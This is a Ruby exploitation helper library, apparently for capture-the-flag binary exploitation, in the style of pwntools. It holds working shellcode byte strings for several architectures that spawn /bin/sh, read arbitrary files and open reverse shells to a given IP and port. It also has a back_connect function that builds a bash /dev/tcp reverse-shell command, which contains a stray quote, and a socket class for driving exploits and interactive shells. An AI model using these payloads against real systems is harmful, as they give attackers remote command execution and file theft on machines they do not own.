#coding:ascii-8bit
require "socket"

module Shellcode
  
  module_function
  def shellcode(arch)
    case arch
    when :x86
      # http://inaz2.hatenablog.com/entry/2014/03/13/013056
      "\x31\xd2\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\x8d\x42\x0b\xcd\x80"
    when :x64
      # http://shell-storm.org/shellcode/files/shellcode-806.php
      "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
    when :arm
      # http://shell-storm.org/shellcode/files/shellcode-698.php
      "\x01\x30\x8f\xe2\x13\xff\x2f\xe1\x78\x46\x08\x30\x49\x1a\x92\x1a\x0b\x27\x01\xdf\x2f\x62\x69\x6e\x2f\x73\x68"
    when :mipsel
      # https://www.exploit-db.com/exploits/35868/
      "\xff\xff\x06\x28\xff\xff\xd0\x04\xff\xff\x05\x28\x01\x10\xe4\x27\x0f\xf0\x84\x24\xab\x0f\x02\x24\x0c\x01\x01\x01"
    end
  end

  def orw(arch, path)
    case arch
    # http://shell-storm.org/shellcode/files/shellcode-73.php
    when :x86      
      "\x31\xc0\x31\xdb\x31\xc9\x31\xd2\xeb\x32\x5b\xb0\x05\x31\xc9\xcd\x80\x89\xc6\xeb\x06\xb0\x01\x31\xdb\xcd\x80\x89\xf3\xb0\x03\x83\xec\x01\x8d\x0c\x24\xb2\x01\xcd\x80\x31\xdb\x39\xc3\x74\xe6\xb0\x04\xb3\x01\xb2\x01\xcd\x80\x83\xc4\x01\xeb\xdf\xe8\xc9\xff\xff\xff#{path}"
      
    # http://shell-storm.org/shellcode/files/shellcode-878.php
    when :x64
      "\xeb\x3f\x5f\x80\x77#{(path.length).chr}\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff#{path}A"
    end
  end
  
  def dup2(arch, newfd = 3)
    case arch
    when :x86
      "\x31\xff\x6a\x3f\x58\x6a#{newfd.chr}\x5b\x89\xf9\xcd\x80\x47\x83\xff\x03\x75\xf0"
    when :x64
      "\x48\x31\xdb\x6a\x21\x58\x6a#{newfd.chr}\x5f\x48\x89\xde\x0f\x05\x48\xff\xc3\x48\x83\xfb\x03\x75\xec"
    end
  end

  def reverse_shell(arch, ip, port)
    case arch
    when :x86
      # http://shell-storm.org/shellcode/files/shellcode-883.php
      "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89\xe1\xcd\x80\x92\xb0\x66\x68" + ip.split(".").map{|a| a.to_i.chr}.join + "\x66\x68" + [port].pack("n") + "\x43\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
    when :x64
      # http://shell-storm.org/shellcode/files/shellcode-857.php
      "\x48\x31\xc0\x48\x31\xff\x48\x31\xf6\x48\x31\xd2\x4d\x31\xc0\x6a" + "\x02\x5f\x6a\x01\x5e\x6a\x06\x5a\x6a\x29\x58\x0f\x05\x49\x89\xc0" + "\x48\x31\xf6\x4d\x31\xd2\x41\x52\xc6\x04\x24\x02\x66\xc7\x44\x24" + "\x02" + [port].pack("n") + "\xc7\x44\x24\x04" + ip.split(".").map{|a| a.to_i.chr}.join + "\x48\x89\xe6\x6a\x10" + "\x5a\x41\x50\x5f\x6a\x2a\x58\x0f\x05\x48\x31\xf6\x6a\x03\x5e\x48" + "\xff\xce\x6a\x21\x58\x0f\x05\x75\xf6\x48\x31\xff\x57\x57\x5e\x5a" + "\x48\xbf\x2f\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xef\x08\x57\x54" + "\x5f\x6a\x3b\x58\x0f\x05"
    end
  end
end

class PwnLib
end

class PwnLib::TimeoutError < IOError
end

class PwnTube
  
  attr_accessor :socket, :wait_time, :debug, :log_output
  
  def initialize(socket, log_output = $>)
    @wait_time = 0
    @debug = false
    @socket = socket
    @log_output = log_output

    self
  end

  def self.open(host, port, log_output = $>, &block)
    socket = TCPSocket.open(host, port)
    instance = self.new(socket, log_output)
    instance.log "[*] connected"

    return instance unless block_given?

    begin
      block.call(instance)
    ensure
      begin
        instance.close
      rescue
      end
    end

    nil
  end

  def close
    @socket.close
    log "[*] connection closed"
  end

  def send(msg)
    @socket.send(msg, 0)
    @socket.flush
    log "<< #{msg.inspect}" if @debug
    sleep(@wait_time)
  end

  def sendline(msg = "")
    self.send(msg + "\n")
  end

  def recv(size = 8192, timeout = nil)
    raise PwnLib::TimeoutError.new if IO.select([@socket], [], [], timeout).nil?
    @socket.recv(size).tap{|a| log ">> #{a.inspect}" if @debug}
  end

  def recv_until(pattern, timeout = nil)
    raise ArgumentError.new("type error") unless pattern.is_a?(String) || pattern.is_a?(Regexp)

    s = ""
    while true
      if pattern.is_a?(String) && s.include?(pattern) || pattern.is_a?(Regexp) && s =~ pattern
        break
      end
      if (c = recv(1, timeout)) && c.length > 0
        s << c
      else
        log s.inspect
        raise EOFError.new
      end
    end
    s
  end

  def recv_until_eof(timeout = nil)
    s = ""
    while (c = recv(1, timeout)) && c.length > 0
      s << c
    end
    s
  end

  def recv_capture(pattern, timeout = nil)
    recv_until(pattern, timeout).match(pattern).captures
  end

  def interactive(terminate_string = nil)
    end_flag = false

    send_thread = Thread.new(self) do |tube|
      begin
        while true
          s = $stdin.gets
          if !s || s.chomp == terminate_string
            break
          end
          tube.socket.send(s, 0)
        end
      rescue
      end
      end_flag = true
    end
    recv_thread = Thread.new(self) do |tube|
      begin
        while !end_flag
          if IO.select([tube.socket], [], [], 0.05) != nil
            buf = tube.socket.recv(8192)
            break if buf.empty?
            $>.print buf
            $>.flush
          end
        end
      rescue => e
        $>.puts "[!] #{e}"
      end
      send_thread.kill
      end_flag = true
    end

    $>.puts "[*] interactive mode"

    [send_thread, recv_thread].each(&:join)
    $>.puts "[*] end interactive mode"
  end

  def shell
    $>.puts "[*] waiting for shell..."
    sleep(0.1)
    self.send("echo PWNED\n")
    self.recv_until("PWNED\n")
    self.interactive
  end

  def log(*args)
    @log_output.puts *args unless @log_output.nil?
  end

  def debugging(&block)
    @debug = true
    yield
    @debug = false
  end
  
end

def asm(fname, arch)
  unless File.exist?(fname)
    STDERR.puts "Not found: #{fname}"
    exit 1
  end
  
  if arch == :x86
    result = `nasm -f elf #{fname} -o /dev/stdout`
    e_shoff     = result[32,4].unpack("L")[0]
    text_header = result[e_shoff + 40, 40]
    text_offset = text_header[16, 4].unpack("L")[0]
    text_size   = text_header[20, 5].unpack("L")[0]
    return result[text_offset, text_size].force_encoding("ascii-8bit")
    
  elsif arch == :x64
    result = `nasm -f elf64 #{fname} -o /dev/stdout`
    e_shoff     = result[40,9].unpack("Q")[0]
    text_header = result[e_shoff*2,64]
    text_offset = text_header[24,9].unpack("Q")[0]
    text_size   = text_header[32,9].unpack("Q")[0]
    return result[text_offset, text_size]
    
  end
  
end

def libc_offset(path, func)
  `nm -D #{path} | grep -w #{func}`.split(" ")[0].to_i(16)
end

def back_connect(host, port)
  "/bin/bash -c 'bash -i >&' /dev/tcp/#{host}/#{port} 0>&1'"
end

def p8(*x)
  x.pack("C*")
end

def u8(x)
  x.unpack("C*")
end

def p16(*x)
  x.pack("S*")
end

def u16(x)
  x.unpack("S*")
end

def p32(*x)
  x.pack("L*")
end

def p64(*x)
  x.pack("Q*")
end

def u32(x)
  x.unpack("L*")
end

def u64(x)
  x.unpack("Q*")
end

NULL                = 0
STDIN_FILENO        = 0
STDOUT_FILENO       = 1
STDERR_FINENO       = 2
SEEK_SET            = 0
SEEK_CUR            = 1
SEEK_END            = 2
O_RDONLY            = 00000
O_WRONLY            = 00001
O_RDWR              = 00002
O_CREAT             = 00100
O_APPEND            = 02000
PROT_NONE           = 0b000
PROT_READ           = 0b001
PROT_WRITE          = 0b010
PROT_EXEC           = 0b100
PROT_RWX            = 0b111
MAP_SHARED          = 0b001
MAP_PRIVATE         = 0b010
MAP_ANONYMOUS       = 0x20
PREV_INUSE          = 0b001
IS_MMAPED           = 0b010
IS_NON_MAINARENA    = 0b100
